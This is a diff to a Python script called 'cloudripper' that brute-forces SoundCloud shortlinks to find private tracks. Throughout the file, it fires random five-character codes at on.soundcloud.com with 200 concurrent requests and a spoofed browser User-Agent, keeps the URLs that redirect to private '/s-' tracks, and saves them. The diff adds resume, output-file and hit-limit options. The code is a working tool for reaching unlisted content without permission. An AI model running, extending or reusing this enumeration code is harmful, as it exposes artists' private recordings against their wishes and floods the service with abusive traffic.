@@ -1,6 +1,4 @@
 #!/usr/bin/env python3
-from __future__ import annotations
-
 import argparse
 import asyncio
 import json
@@ -18,37 +16,32 @@ init(autoreset=True)
 
 CHARSET = string.ascii_letters + string.digits
 PRIVATE_RE = re.compile(r"/s-[a-zA-Z0-9]{11}")
-OUTPUT = Path("output.json")
-
-BANNER = f"""{Fore.LIGHTGREEN_EX}
-  ╔══════════════════════════════╗
-  ║  C L O U D R I P P E R  v2  ║
-  ╚══════════════════════════════╝{Style.RESET_ALL}
-"""
 
 
 class Stats:
-    def __init__(self) -> None:
+    def __init__(self, initial_hits=0):
         self.total = 0
-        self.hits = 0
+        self.hits = initial_hits
         self._t0 = time.perf_counter()
 
     @property
-    def elapsed(self) -> float:
+    def elapsed(self):
         return time.perf_counter() - self._t0
 
     @property
-    def rate(self) -> float:
+    def rate(self):
         e = self.elapsed
         return self.total / e if e > 0 else 0.0
 
 
-async def probe(
-    session: aiohttp.ClientSession,
-    sem: asyncio.Semaphore,
-    stats: Stats,
-    verbose: int,
-) -> str | None:
+def parse_track(url):
+    parts = urlparse(url).path.strip("/").split("/")
+    if len(parts) >= 2:
+        return parts[0], parts[1]
+    return None, None
+
+
+async def probe(session, sem, stats, verbose):
     code = "".join(random.choices(CHARSET, k=5))
     url = f"https://on.soundcloud.com/{code}"
     try:
@@ -61,18 +54,18 @@ async def probe(
                     if PRIVATE_RE.search(clean):
                         return clean
                     if verbose >= 1:
-                        print(f"\n{Fore.BLUE}  ~ public   {clean}{Style.RESET_ALL}")
+                        print(f"\n{Fore.BLUE}  ~ {clean}{Style.RESET_ALL}")
                 elif verbose >= 2:
-                    print(f"\n{Fore.RED}  - miss     {url}{Style.RESET_ALL}")
+                    print(f"\n{Fore.RED}  - {url}{Style.RESET_ALL}")
     except Exception:
         stats.total += 1
     return None
 
 
-async def stat_loop(stats: Stats, stop: asyncio.Event) -> None:
+async def stat_loop(stats, stop):
     while not stop.is_set():
         print(
-            f"\r{Fore.CYAN}{stats.elapsed:6.0f}s "
+            f"\r{Fore.CYAN}{stats.elapsed:6.0f}s  "
             f"{Fore.WHITE}{stats.total:>10,} req  "
             f"{Fore.GREEN}{stats.hits:>4} hits  "
             f"{Fore.YELLOW}{stats.rate:>7.0f} req/s{Style.RESET_ALL}   ",
@@ -82,10 +75,21 @@ async def stat_loop(stats: Stats, stop: asyncio.Event) -> None:
         await asyncio.sleep(0.4)
 
 
-async def run(concurrency: int, verbose: int) -> None:
-    results: list[str] = []
-    seen: set[str] = set()
-    stats = Stats()
+async def run(concurrency, verbose, out, limit):
+    out = Path(out)
+    seen = set()
+    results = []
+
+    if out.exists():
+        try:
+            existing = json.loads(out.read_text())
+            results = existing
+            seen = set(existing)
+            print(f"{Fore.YELLOW}  resuming — {len(seen)} tracks already in {out}{Style.RESET_ALL}\n")
+        except Exception:
+            pass
+
+    stats = Stats(initial_hits=len(seen))
     stop = asyncio.Event()
 
     connector = aiohttp.TCPConnector(
@@ -94,30 +98,27 @@ async def run(concurrency: int, verbose: int) -> None:
         ttl_dns_cache=600,
         enable_cleanup_closed=True,
     )
-    session_timeout = aiohttp.ClientTimeout(total=10, connect=5)
-    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
 
     async with aiohttp.ClientSession(
         connector=connector,
-        headers=headers,
-        timeout=session_timeout,
+        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
+        timeout=aiohttp.ClientTimeout(total=10, connect=5),
     ) as session:
         sem = asyncio.Semaphore(concurrency)
-        tasks: set[asyncio.Task] = set()
+        tasks = set()
         stat_task = asyncio.create_task(stat_loop(stats, stop))
 
-        def _fill() -> None:
+        def fill():
             while len(tasks) < concurrency:
-                t = asyncio.create_task(probe(session, sem, stats, verbose))
-                tasks.add(t)
+                tasks.add(asyncio.create_task(probe(session, sem, stats, verbose)))
 
-        _fill()
+        fill()
 
         try:
             while True:
                 done, _ = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                 tasks.difference_update(done)
-                _fill()
+                fill()
 
                 for t in done:
                     url = t.result()
@@ -125,8 +126,13 @@ async def run(concurrency: int, verbose: int) -> None:
                         seen.add(url)
                         stats.hits += 1
                         results.append(url)
-                        print(f"\n{Fore.GREEN}[+] {url}{Style.RESET_ALL}")
-                        OUTPUT.write_text(json.dumps(results, indent=2))
+                        artist, track = parse_track(url)
+                        label = f"{artist} — {track}" if artist else url
+                        print(f"\n{Fore.GREEN}[+] {label}{Style.RESET_ALL}")
+                        print(f"    {Fore.WHITE}{url}{Style.RESET_ALL}")
+                        out.write_text(json.dumps(results, indent=2))
+                        if limit and stats.hits >= limit:
+                            raise KeyboardInterrupt
 
         except (KeyboardInterrupt, asyncio.CancelledError):
             stop.set()
@@ -136,38 +142,29 @@ async def run(concurrency: int, verbose: int) -> None:
             await asyncio.gather(*tasks, stat_task, return_exceptions=True)
 
     print(
-        f"\n\n{Fore.YELLOW}[!] Stopped.  "
-        f"{stats.hits} private tracks  /  {stats.total:,} requests  "
-        f"({stats.rate:.0f} req/s){Style.RESET_ALL}"
+        f"\n\n{Fore.YELLOW}  {stats.hits} private tracks  /  "
+        f"{stats.total:,} requests  /  {stats.rate:.0f} req/s{Style.RESET_ALL}"
     )
     if results:
-        OUTPUT.write_text(json.dumps(results, indent=2))
-        print(f"{Fore.GREEN}[+] Saved → {OUTPUT}{Style.RESET_ALL}")
+        out.write_text(json.dumps(results, indent=2))
+        print(f"{Fore.GREEN}  saved -> {out}{Style.RESET_ALL}\n")
 
 
-def main() -> None:
-    print(BANNER)
-    p = argparse.ArgumentParser(
-        description="Bruteforce SoundCloud shortlinks to find private tracks"
-    )
-    p.add_argument(
-        "-c", "--concurrency",
-        type=int, default=200, metavar="N",
-        help="concurrent requests (default: 200)",
-    )
-    p.add_argument(
-        "-v", "--verbose",
-        action="count", default=0,
-        help="-v show public tracks, -vv show all misses",
-    )
+def main():
+    print(f"\n{Fore.LIGHTGREEN_EX}  cloudripper{Style.RESET_ALL}\n")
+
+    p = argparse.ArgumentParser(add_help=False)
+    p.add_argument("-c", type=int, default=200, metavar="N", dest="concurrency")
+    p.add_argument("-n", type=int, default=0, metavar="N", dest="limit")
+    p.add_argument("-o", default="output.json", metavar="FILE", dest="output")
+    p.add_argument("-v", action="count", default=0, dest="verbose")
+    p.add_argument("-h", "--help", action="help")
     args = p.parse_args()
 
-    print(
-        f"{Fore.CYAN}[*] {args.concurrency} concurrent workers — "
-        f"Ctrl+C to stop\n{Style.RESET_ALL}"
-    )
+    print(f"  {Fore.CYAN}{args.concurrency} workers{Style.RESET_ALL}  |  Ctrl+C to stop\n")
+
     try:
-        asyncio.run(run(args.concurrency, args.verbose))
+        asyncio.run(run(args.concurrency, args.verbose, args.output, args.limit))
     except KeyboardInterrupt:
         pass
 
